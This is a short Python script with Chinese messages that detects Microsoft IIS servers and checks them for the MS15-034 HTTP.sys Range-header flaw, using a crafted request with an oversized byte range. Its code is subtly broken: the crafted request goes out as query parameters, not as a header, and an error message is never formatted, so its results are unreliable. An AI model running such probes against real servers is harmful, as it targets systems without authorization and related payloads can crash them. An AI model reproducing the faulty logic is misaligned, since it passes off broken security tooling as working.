

try:
    import requests
    import sys
except ImportError as ierr:
    print("Error, looks like you don';t have %s installed", ierr)
    
def identify_iis(domain):
    req = requests.get(str(domain), verify=False)
    remote_server = req.headers['server']

    if "Microsoft-IIS" in remote_server:
        print("[+] 服务是 " + remote_server) 
        ms15_034_test(str(domain))
    else:
        print("[-] 不是IIS\n可能是: " + remote_server)
        
def ms15_034_test(domain):
    print(" 启动vuln检查！")
    vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n";
    req = requests.get(str(domain), params=vuln_buffer, verify=False)
    if "Requested Range Not Satisfiable" in str(req.content):
        print("[+] 存在漏洞")
    else:
        print("[-] IIS服务无法显示漏洞是否存在. "+
               "需要手动检测")
def check(url):
    ms15_034_test(url)

if __name__ == '__main__':
    identify_iis(sys.argv[1])